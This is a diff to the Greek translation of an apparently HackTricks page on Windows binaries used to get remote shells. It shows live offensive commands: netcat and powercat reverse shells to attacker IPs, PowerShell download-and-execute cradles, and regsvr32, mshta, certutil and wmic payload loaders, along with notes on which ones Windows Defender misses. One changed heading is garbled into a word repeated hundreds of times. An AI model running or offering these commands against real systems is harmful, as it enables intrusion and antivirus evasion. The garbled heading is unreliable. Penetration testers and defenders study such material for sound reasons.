@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks AWS)</strong></a><strong>!</strong></summary>
 
 Άλλοι τρόποι υποστήριξης του HackTricks:
 
@@ -10,14 +10,22 @@
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του GitHub.
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του GitHub.
 
 </details>
+
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
 
 ## Lolbas
 
 Η σελίδα [lolbas-project.github.io](https://lolbas-project.github.io/) είναι για Windows όπως το [https://gtfobins.github.io/](https://gtfobins.github.io/) είναι για Linux.\
-Φυσικά, **δεν υπάρχουν αρχεία SUID ή προνόμια sudo στα Windows**, αλλά είναι χρήσιμο να γνωρίζετε **πώς** μερικά **εκτελέσιμα αρχεία** μπορούν να χρησιμοποιηθούν (κατ) για να εκτελέσουν κάποιες μορφές απροσδόκητων ενεργειών όπως **εκτέλεση αυθαίρετου κώδικα.**
+Φυσικά, **δεν υπάρχουν αρχεία SUID ή προνόμια sudo στα Windows**, αλλά είναι χρήσιμο να γνωρίζετε **πώς** μερικά **εκτελέσιμα αρχεία** μπορούν να χρησιμοποιηθούν (κατ) για να εκτελέσουν κάποιες μη αναμενόμενες ενέργειες όπως **εκτέλεση αυθαίρετου κώδικα.**
 
 ## NC
 ```bash
@@ -25,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) είναι μια φορητή και ασφαλής εναλλακτική λύση για το Netcat**. Λειτουργεί σε συστήματα παρόμοια με Unix και Win32. Με χαρακτηριστικά όπως ισχυρή κρυπτογράφηση, εκτέλεση προγραμμάτων, προσαρμοζόμενες πηγές θυρών και συνεχή επανασύνδεση, το sbd παρέχει μια ευέλικτη λύση για επικοινωνία TCP/IP. Για τους χρήστες των Windows, η έκδοση sbd.exe από τη διανομή Kali Linux μπορεί να χρησιμοποιηθεί ως αξιόπιστη αντικατάσταση για το Netcat.
+**[sbd](https://www.kali.org/tools/sbd/) είναι μια φορητή και ασφαλής εναλλακτική λύση για το Netcat**. Λειτουργεί σε συστήματα παρόμοια με Unix και Win32. Με χαρακτηριστικά όπως ισχυρή κρυπτογράφηση, εκτέλεση προγραμμάτων, προσαρμοζόμενες πηγές θυρών και συνεχή επανασύνδεση, το sbd παρέχει μια ευέλικτη λύση για την επικοινωνία TCP/IP. Για τους χρήστες των Windows, η έκδοση sbd.exe από τη διανομή Kali Linux μπορεί να χρησιμοποιηθεί ως αξιόπιστη αντικατάσταση για το Netcat.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -79,8 +87,8 @@ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Διαδικασία που εκτελεί κλήση δικτύου: **powershell.exe**\
-Φορτίο που έχει γραφτεί στον δίσκο: **ΟΧΙ** (_τουλάχιστον πουθενά που μπόρεσα να βρω χρησιμοποιώντας το procmon!_)
+Διεργασία που εκτελεί κλήση δικτύου: **powershell.exe**\
+Φορτίο γραμμένο στον δίσκο: **ΟΧΙ** (_τουλάχιστον πουθενά που μπόρεσα να βρω χρησιμοποιώντας το procmon!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
@@ -111,7 +119,7 @@ mshta \\webdavserver\folder\payload.hta
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Μπορείτε εύκολα να κατεβάσετε και να εκτελέσετε ένα Koadic zombie χρησιμοποιώντας το στάδιο hta**
+**Μπορείτε εύκολα να κατεβάσετε και να εκτελέσετε ένα zombie του Koadic χρησιμοποιώντας το stager hta**
 
 #### παράδειγμα hta
 
@@ -220,7 +228,7 @@ regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
 ```
 regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
 ```
-**Ανιχνεύθηκε από τον defender**
+**Ανιχνεύτηκε από τον defender**
 
 #### Regsvr32 -sct
 
@@ -250,7 +258,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Μπορείτε να κατεβάσετε και να εκτελέσετε πολύ εύκολα ένα Koadic zombie χρησιμοποιώντας το stager regsvr**
+**Μπορείτε εύκολα να κατεβάσετε και να εκτελέσετε ένα Koadic zombie χρησιμοποιώντας το stager regsvr**
 
 ## Certutil
 
@@ -264,7 +272,7 @@ certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
-**Ανιχνεύθηκε από τον αμυντικό**
+**Ανιχνεύθηκε από τον defender**
 
 
 ## **Cscript/Wscript**
@@ -275,9 +283,9 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Ανιχνεύθηκε από τον ανιχνευτή**
+**Ανιχνεύθηκε από τον αμυντικό**
 
-## Εκτέλεση PowerShell μέσω αρχείου εντολών .bat
+## Εκτέλεση-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολών-Εντολ
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
@@ -312,7 +320,7 @@ victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
 ```bash
 wmic os get /format:"https://webserver/payload.xsl"
 ```
-Παράδειγμα αρχείου xsl [από εδώ](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
+Παράδειγμα αρχείου xsl [εδώ](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7):
 ```xml
 <?xml version='1.0'?>
 <stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
@@ -326,7 +334,7 @@ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object N
 ```
 **Μην ανιχνεύεται**
 
-**Μπορείτε να κατεβάσετε & να εκτελέσετε πολύ εύκολα ένα Koadic zombie χρησιμοποιώντας το στάδιο wmic**
+**Μπορείτε να κατεβάσετε & εκτελέσετε πολύ εύκολα ένα Koadic zombie χρησιμοποιώντας το στάδιο wmic**
 
 ## Msbuild
 
@@ -339,11 +347,11 @@ cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" 
 ```
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
 ```
-**Μην ανιχνεύεται**
+**Μην ανιχνεύθηκε**
 
 ## **CSC**
 
-Συντάξτε κώδικα C# στο μηχάνημα του θύματος.
+Συντάξτε κώδικα C# στη μηχανή του θύματος.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
@@ -381,13 +389,13 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Ξεκινήστε την εξυπηρέτηση του script σε έναν διακομιστή web και εκτελέστε το στο τέλος του θύματος:
+Ξεκινήστε την εξυπηρέτηση του script σε έναν web server και εκτελέστε το στο τέλος του θύματος:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 Ο Defender δεν το ανιχνεύει ως κακόβουλο κώδικα (ακόμα, 3/04/2019).
 
-**ΕΡΓΑΣΙΕΣ: Ελέγξτε άλλα nishang shells**
+**TODO: Ελέγξτε άλλα nishang shells**
 
 ### **PS-Powercat**
 
@@ -397,9 +405,11 @@ powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
-**Άλλες επιλογές που προσφέρονται από το powercat:**
+Ο Defender δεν το ανιχνεύει ως κακόβουλο κώδικα (ακόμα, 3/04/2019).
 
-Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, Generate payloads, Serve files...
+**Άλλες επιλογές που προσφέρει το powercat:**
+
+Συνδέσεις bind, Αντίστροφη σύνδεση (TCP, UDP, DNS), Ανακατεύθυνση θύρας, Μεταφόρτωση/Λήψη, Δημιουργία φορτίων, Υπηρεσία αρχείων...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -442,7 +452,7 @@ msfconsole -r unicorn.rc
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
-**Ανιχνεύτηκε ως κακόβουλος κώδικας**
+**Ανιχνεύθηκε ως κακόβουλος κώδικας**
 
 ## Περισσότερα
 
@@ -460,16 +470,22 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) Κονσόλα PS με ορι�
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
 <summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Άλλοι τρόποι υποστήριξης του HackTricks:
 
-* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
+* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
 * Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του GitHub.
+* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.
 
 </details>
